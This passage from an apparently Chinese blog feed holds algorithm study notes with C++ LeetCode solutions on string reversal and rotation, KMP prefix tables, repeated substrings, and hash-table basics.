class="hljs-keyword">if</span> (i == s.<span class="hljs-built_in">size</span>() || s[i] == <span class="hljs-string">&#x27; &#x27;</span>) &#123; <span class="hljs-comment">//到达空格或者串尾，说明一个单词结束。进行翻转。</span><br>                <span class="hljs-built_in">reverse</span>(s, start, i - <span class="hljs-number">1</span>); <span class="hljs-comment">//翻转，注意是左闭右闭 []的翻转。</span><br>                start = i + <span class="hljs-number">1</span>; <span class="hljs-comment">//更新下一个单词的开始下标start</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="左旋转字符串">左旋转字符串</h1><p><ahref="https://leetcode.cn/problems/zuo-xuan-zhuan-zi-fu-chuan-lcof/">剑指Offer 58 - II. 左旋转字符串 - 力扣（LeetCode）</a></p><ol type="1"><li>反转区间为前n的子串</li><li>反转区间为n到末尾的子串</li><li>反转整个字符串</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">reverseLeftWords</span><span class="hljs-params">(string s, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-built_in">reverse</span>(s.<span class="hljs-built_in">begin</span>(), s.<span class="hljs-built_in">begin</span>() + n);<br>        <span class="hljs-built_in">reverse</span>(s.<span class="hljs-built_in">begin</span>() + n, s.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-built_in">reverse</span>(s.<span class="hljs-built_in">begin</span>(), s.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="实现strstr">实现strStr()</h1><p><ahref="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/">28.找出字符串中第一个匹配项的下标 - 力扣（LeetCode）</a></p><h2 id="什么是kmp">什么是KMP</h2><p>因为是由这三位学者发明的：Knuth，Morris和Pratt，所以取了三位学者名字的首字母。所以叫做KMP</p><h2 id="什么是前缀表">什么是前缀表</h2><p><strong>前缀表是用来回退的，它记录了模式串与主串(文本串)不匹配的时候，模式串应该从哪里开始重新匹配</strong></p><p>首先要知道前缀表的任务是当前位置匹配失败，找到之前已经匹配上的位置，再重新匹配，此也意味着在某个字符失配时，前缀表会告诉你下一步匹配中，模式串应该跳到哪个位置。</p><p>那么什么是前缀表：<strong>记录下标i之前（包括i）的字符串中，有多大长度的相同前缀后缀。</strong></p><h2 id="最长公共前后缀">最长公共前后缀</h2><p><strong>前缀是指不包含最后一个字符的所有以第一个字符开头的连续子串。</strong></p><p><strong>后缀是指不包含第一个字符的所有以最后一个字符结尾的连续子串。</strong></p><p><strong>前缀表要求的就是相同前后缀的长度。</strong></p><h2 id="如何计算前缀表">如何计算前缀表</h2><p>长度为前1个字符的子串<code>a</code>，最长相同前后缀的长度为0。（注意字符串的<strong>前缀是指不包含最后一个字符的所有以第一个字符开头的连续子串</strong>；<strong>后缀是指不包含第一个字符的所有以最后一个字符结尾的连续子串</strong>。）</p><p>子串<code>aa</code>，最长相同前后缀的长度为1</p><p>子串<code>aab</code>，最长相同前后缀的长度为0。</p><p>可以看出模式串与前缀表对应位置的数字表示的就是：<strong>下标i之前（包括i）的字符串中，有多大长度的相同前缀后缀。</strong></p><h2 id="为什么一定要用前缀表">为什么一定要用前缀表</h2><p><strong>下标5之前这部分的字符串（也就是字符串aabaa）的最长相等的前缀和 后缀字符串是 子字符串aa，因为找到了最长相等的前缀和后缀，匹配失败的位置是后缀子串的后面，那么我们找到与其相同的前缀的后面从新匹配就可以了。</strong></p><h2 id="前缀表与next数组">前缀表与next数组</h2><p>next数组就可以是前缀表，但是很多实现都是把前缀表统一减一（右移一位，初始位置为-1）之后作为next数组。</p><h2 id="使用next数组来匹配">使用next数组来匹配</h2><h2 id="构造next数组">构造next数组</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getNext</span><span class="hljs-params">(<span class="hljs-type">int</span>* next, <span class="hljs-type">const</span> string&amp; s)</span></span><br></code></pre></td></tr></table></figure><ol type="1"><li>初始化</li><li>处理前后缀不相同的情况</li><li>处理前后缀相同的情况</li></ol><h3 id="初始化">初始化</h3><p>定义两个指针i和j，j指向前缀末尾位置，i指向后缀末尾位置。</p><p>然后还要对next数组进行初始化赋值，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>;<br>next[<span class="hljs-number">0</span>] = j;<br></code></pre></td></tr></table></figure><p>next[i] 表示 i（包括i）之前最长相等的前后缀长度（其实就是j）</p><h3 id="处理前后缀不相同的情况">处理前后缀不相同的情况</h3><p>因为j初始化为-1，那么i就从1开始，进行s[i] 与 s[j+1]的比较。</p><p>所以遍历模式串s的循环下标i 要从 1开始，代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) &#123;<br></code></pre></td></tr></table></figure><p>如果 s[i] 与 s[j+1]不相同，也就是遇到前后缀末尾不相同的情况，就要向前回退。</p><p>next[j]就是记录着j（包括j）之前的子串的相同前后缀的长度。</p><p>那么 s[i] 与 s[j+1] 不相同，就要找j+1前一个元素在next数组里的值（就是next[j]）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; s[i] != s[j + <span class="hljs-number">1</span>]) &#123; <span class="hljs-comment">// 前后缀不相同了</span><br>    j = next[j]; <span class="hljs-comment">// 向前回退</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="处理前后缀相同的情况">处理前后缀相同的情况</h3><p>如果 s[i] 与 s[j + 1] 相同，那么就同时向后移动i 和j说明找到了相同的前后缀，同时还要将j（前缀的长度）赋给next[i],因为next[i]要记录相同前后缀的长度。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (s[i] == s[j + <span class="hljs-number">1</span>]) &#123; <span class="hljs-comment">// 找到相同的前后缀</span><br>    j++;<br>&#125;<br>next[i] = j;<br></code></pre></td></tr></table></figure><p>整体函数代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getNext</span><span class="hljs-params">(<span class="hljs-type">int</span>* next, <span class="hljs-type">const</span> string&amp; s)</span></span>&#123;<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>;<br>    next[<span class="hljs-number">0</span>] = j;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) &#123; <span class="hljs-comment">// 注意i从1开始</span><br>        <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; s[i] != s[j + <span class="hljs-number">1</span>]) &#123; <span class="hljs-comment">// 前后缀不相同了</span><br>            j = next[j]; <span class="hljs-comment">// 向前回退</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (s[i] == s[j + <span class="hljs-number">1</span>]) &#123; <span class="hljs-comment">// 找到相同的前后缀</span><br>            j++;<br>        &#125;<br>        next[i] = j; <span class="hljs-comment">// 将j（前缀的长度）赋给next[i]</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="使用next数组来做匹配">使用next数组来做匹配</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>; <span class="hljs-comment">// 因为next数组里记录的起始位置为-1</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) &#123; <span class="hljs-comment">// 注意i就从0开始</span><br>    <span class="hljs-keyword">while</span>(j &gt;= <span class="hljs-number">0</span> &amp;&amp; s[i] != t[j + <span class="hljs-number">1</span>]) &#123; <span class="hljs-comment">// 不匹配</span><br>        j = next[j]; <span class="hljs-comment">// j 寻找之前匹配的位置</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (s[i] == t[j + <span class="hljs-number">1</span>]) &#123; <span class="hljs-comment">// 匹配，j和i同时向后移动</span><br>        j++; <span class="hljs-comment">// i的增加在for循环里</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (j == (t.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>) ) &#123; <span class="hljs-comment">// 文本串s里出现了模式串t</span><br>        <span class="hljs-keyword">return</span> (i - t.<span class="hljs-built_in">size</span>() + <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="前缀表统一减一实现">前缀表统一减一实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getNext</span><span class="hljs-params">(<span class="hljs-type">int</span>* next, <span class="hljs-type">const</span> string&amp; s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>;<br>        next[<span class="hljs-number">0</span>] = j;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) &#123; <span class="hljs-comment">// 注意i从1开始</span><br>            <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; s[i] != s[j + <span class="hljs-number">1</span>]) &#123; <span class="hljs-comment">// 前后缀不相同了</span><br>                j = next[j]; <span class="hljs-comment">// 向前回退</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (s[i] == s[j + <span class="hljs-number">1</span>]) &#123; <span class="hljs-comment">// 找到相同的前后缀</span><br>                j++;<br>            &#125;<br>            next[i] = j; <span class="hljs-comment">// 将j（前缀的长度）赋给next[i]</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">strStr</span><span class="hljs-params">(string haystack, string needle)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (needle.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> next[needle.<span class="hljs-built_in">size</span>()];<br>        <span class="hljs-built_in">getNext</span>(next, needle);<br>        <span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>; <span class="hljs-comment">// // 因为next数组里记录的起始位置为-1</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; haystack.<span class="hljs-built_in">size</span>(); i++) &#123; <span class="hljs-comment">// 注意i就从0开始</span><br>            <span class="hljs-keyword">while</span>(j &gt;= <span class="hljs-number">0</span> &amp;&amp; haystack[i] != needle[j + <span class="hljs-number">1</span>]) &#123; <span class="hljs-comment">// 不匹配</span><br>                j = next[j]; <span class="hljs-comment">// j 寻找之前匹配的位置</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (haystack[i] == needle[j + <span class="hljs-number">1</span>]) &#123; <span class="hljs-comment">// 匹配，j和i同时向后移动</span><br>                j++; <span class="hljs-comment">// i的增加在for循环里</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (j == (needle.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>) ) &#123; <span class="hljs-comment">// 文本串s里出现了模式串t</span><br>                <span class="hljs-keyword">return</span> (i - needle.<span class="hljs-built_in">size</span>() + <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="前缀表不减一实现">前缀表不减一实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getNext</span><span class="hljs-params">(<span class="hljs-type">int</span>* next, <span class="hljs-type">const</span> string&amp; s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>        next[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">while</span> (j &gt; <span class="hljs-number">0</span> &amp;&amp; s[i] != s[j]) &#123;<br>                j = next[j - <span class="hljs-number">1</span>];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (s[i] == s[j]) &#123;<br>                j++;<br>            &#125;<br>            next[i] = j;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">strStr</span><span class="hljs-params">(string haystack, string needle)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (needle.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> next[needle.<span class="hljs-built_in">size</span>()];<br>        <span class="hljs-built_in">getNext</span>(next, needle);<br>        <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; haystack.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">while</span>(j &gt; <span class="hljs-number">0</span> &amp;&amp; haystack[i] != needle[j]) &#123;<br>                j = next[j - <span class="hljs-number">1</span>];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (haystack[i] == needle[j]) &#123;<br>                j++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (j == needle.<span class="hljs-built_in">size</span>() ) &#123;<br>                <span class="hljs-keyword">return</span> (i - needle.<span class="hljs-built_in">size</span>() + <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="重复的子字符串">重复的子字符串</h1><p><ahref="https://leetcode.cn/problems/repeated-substring-pattern/">459.重复的子字符串 - 力扣（LeetCode）</a></p><h2 id="移动匹配">移动匹配</h2><p>当一个字符串s：abcabc，内部又重复的子串组成，那么这个字符串的结构一定是这样的：</p><p>也就是由前后又相同的子串组成。</p><p>那么既然前面有相同的子串，后面有相同的子串，用 s +s，这样组成的字符串中，后面的子串做前串，前后的子串做后串，就一定还能组成一个s，如图：</p><p>所以判断字符串s是否有重复子串组成，只要两个s拼接在一起，里面还出现一个s的话，就说明是又重复子串组成。</p><p>当然，我们在判断 s + s拼接的字符串里是否出现一个s的的时候，<strong>要刨除 s + s的首字符和尾字符</strong>，这样避免在s+s中搜索出原来的s，我们要搜索的是中间拼接出来的s。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">repeatedSubstringPattern</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        string t = s + s;<br>        t.<span class="hljs-built_in">erase</span>(t.<span class="hljs-built_in">begin</span>()); t.<span class="hljs-built_in">erase</span>(t.<span class="hljs-built_in">end</span>() - <span class="hljs-number">1</span>); <span class="hljs-comment">// 掐头去尾</span><br>        <span class="hljs-keyword">if</span> (t.<span class="hljs-built_in">find</span>(s) != std::string::npos) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// r</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="kmp">KMP</h2><h3 id="简单推理">简单推理</h3><p>假设字符串s使用多个重复子串构成（这个子串是最小重复单位），重复出现的子字符串长度是x，所以s是由n* x组成。</p><p>因为字符串s的最长相同前后缀的的长度一定是不包含s本身，所以最长相同前后缀长度必然是m * x，而且 n - m =1，（这里如果不懂，看上面的推理）</p><p>所以如果 nx % (n - m)x = 0，就可以判定有重复出现的子字符串。</p><p>next 数组记录的就是最长相同前后缀 <ahref="https://programmercarl.com/0028.实现strStr.html">字符串：KMP算法精讲(opens newwindow)</a>这里介绍了什么是前缀，什么是后缀，什么又是最长相同前后缀)，如果 next[len - 1] !=-1，则说明字符串有最长相同的前后缀（就是字符串里的前缀子串和后缀子串相同的最长长度）。</p><p>最长相等前后缀的长度为：next[len - 1] +1。(这里的next数组是以统一减一的方式计算的，因此需要+1，两种计算next数组的具体区别看这里：<ahref="https://programmercarl.com/0028.实现strStr.html">字符串：KMP算法精讲(opens new window)</a>)</p><p>数组长度为：len。</p><p>如果len % (len - (next[len - 1] + 1)) == 0，则说明数组的长度正好可以被 (数组长度-最长相等前后缀的长度) 整除，说明该字符串有重复的子字符串。</p><p><strong>数组长度减去最长相同前后缀的长度相当于是第一个周期的长度，也就是一个周期的长度，如果这个周期可以被整除，就说明整个数组就是这个周期的循环。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getNext</span> <span class="hljs-params">(<span class="hljs-type">int</span>* next, <span class="hljs-type">const</span> string&amp; s)</span></span>&#123;<br>        next[<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>;<br>        <span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt; s.<span class="hljs-built_in">size</span>(); i++)&#123;<br>            <span class="hljs-keyword">while</span>(j &gt;= <span class="hljs-number">0</span> &amp;&amp; s[i] != s[j + <span class="hljs-number">1</span>]) &#123;<br>                j = next[j];<br>            &#125;<br>            <span class="hljs-keyword">if</span>(s[i] == s[j + <span class="hljs-number">1</span>]) &#123;<br>                j++;<br>            &#125;<br>            next[i] = j;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">repeatedSubstringPattern</span> <span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (s.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> next[s.<span class="hljs-built_in">size</span>()];<br>        <span class="hljs-built_in">getNext</span>(next, s);<br>        <span class="hljs-type">int</span> len = s.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (next[len - <span class="hljs-number">1</span>] != <span class="hljs-number">-1</span> &amp;&amp; len % (len - (next[len - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>哈希表</title>
    <link href="/2022/09/11/Algorithm/algorithm-3/"/>
    <url>/2022/09/11/Algorithm/algorithm-3/</url>
    
    <content type="html"><![CDATA[<p>本文为学习<ahref="https://programmercarl.com/">代码随想录</a>时所做的笔记，仅供学习参考，不做任何商业用途，若有侵权，请联系删除。</p><h1 id="哈希表理论基础">哈希表理论基础</h1><p><strong>哈希表是根据关键码的值直接进行访问的数据结构</strong></p><p>那么哈希表能解决什么问题呢，<strong>一般哈希表都是用来快速判断一个元素是否出现集合里。</strong></p><p>例如要查询一个名字是否在这所学校里。要枚举的话时间复杂度是O(n)，但如果使用哈希表的话，只需要O(1)就可以做到。</p><p>我们只需要初始化把这所学校里学生的名字都存在哈希表里，在查询的时候通过索引直接就可以知道这位同学在不在这所学校里了。</p><p>将学生姓名映射到哈希表上就涉及到了<strong>hash function，也就是哈希函数</strong>。</p><span id="more"></span><h2 id="哈希函数">哈希函数</h2><h2 id="哈希碰撞">哈希碰撞</h2><p>不同的原值在经过哈希函数映射之后，得到了同一个索引，这一现象叫做哈希碰撞。</p><h3 id="拉链法">拉链法</h3><h3 id="线性探测法">线性探测法</h3><p>使用线性探测法，一定要保证tableSize大于dataSize。我们需要依靠哈希表中的空位来解决碰撞问题。</p><p>例如冲突的位置，放了小李，那么就向下找一个空位放置小王的信息。所以要求tableSize一定要大于dataSize，要不然哈希表上就没有空置的位置来存放 冲突的数据了。如图所示：</p><h2 id="常见的三种哈希结构">常见的三种哈希结构</h2><ul><li>数组</li><li>set （集合）</li><li>map （映射）</li></ul><p>C++中的哈希数据结构：</p><table style="width:100%;"><thead><tr class="header"><th>集合</th><th>底层实现</th><th>是否有序</th><th>数值是否可以重复</th><th>能否更改数值</th><th>查询效率</th><th>增删效率</th></tr></thead><tbody><tr class="odd"><td>std::set</td><td>红黑树</td><td>有序</td><td>否</td><td>否</td><td>O(log n)</td><td>O(log n)</td></tr><tr class="even"><td>std::multiset</td><td>红黑树</td><td>有序</td><td>是</td><td>否</td><td>O(logn)</td><td>O(logn)</td></tr><tr class="odd"><td>std::unordered_set</td><td>哈希表</td><td>无序</td><td>否</td><td>否</td><td>O(1)</td><td>O(1)</td></tr></tbody></table><p>std::unordered_set底层实现为哈希表，std::set 和std::multiset的底层实现是红黑树，<strong>红黑树</strong>是一种平衡二叉搜索树，所以key值是有序的，但key不可以修改，改动key值会导致整棵树的错乱，所以<strong>只能删除和增加</strong></p><table style="width:100%;"><thead><tr class="header"><th>映射</th><th>底层实现</th><th>是否有序</th><th>数值是否可以重复</th><th>能否更改数值</th><th>查询效率</th><th>增删效率</th></tr></thead><tbody><tr class="odd"><td>std::map</td><td>红黑树</td><td>key有序</td><td>key不可重复</td><td>key不可修改</td><td>O(logn)</td><td>O(logn)</td></tr><tr class="even"><td>std::multimap</td><td>红黑树</td><td>key有序</td><td>key可重复</td><td>key不可修改</td><td>O(log n)</td><td>O(log n)</td></tr><tr class="odd"><td>std::unordered_map</td><td>哈希表</td><td>key无序</td><td>key不可重复</td><td>key不可修改</td><td>O(1)</td><td>O(1)</td></tr></tbody></table><h2 id="总结">总结</h2><p>哈希法也是<strong>牺牲了空间换取了时间</strong>，因为我们要使用额外的数组，set或者是map来存放数据，才能实现快速的查找。</p><h1 id="有效的字母异位词">有效的字母异位词</h1><p><a href="https://leetcode.cn/problems/valid-anagram/">242.有效的字母异位词 - 力扣（LeetCode）</a></p><ul><li>字符映射为数值做下标</li><li>首先遍历<code>strA</code>，每出现一个字符，将哈希表中对应位置的值加1</li><li>再遍历<code>strB</code>，每出现一个字符，将哈希表中对应位置的值减1</li><li>重新遍历哈希表，若表中有元素不为0，说明不满足条件</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isAnagram</span><span class="hljs-params">(string s, string t)</span> </span>&#123;<br>        <span class="hljs-type">int</span> record[<span class="hljs-number">26</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-comment">// 并不需要记住字符a的ASCII，只要求出一个相对数值就可以了</span><br>            record[s[i] - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; t.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            record[t[i] - <span class="hljs-string">&#x27;a&#x27;</span>]--;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span> (record[i] != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// record数组如果有的元素不为零0，说明字符串s和t 一定是谁多了字符或者谁少了字符。</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// record数组所有元素都为零0，说明字符串s和t是字母异位词</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    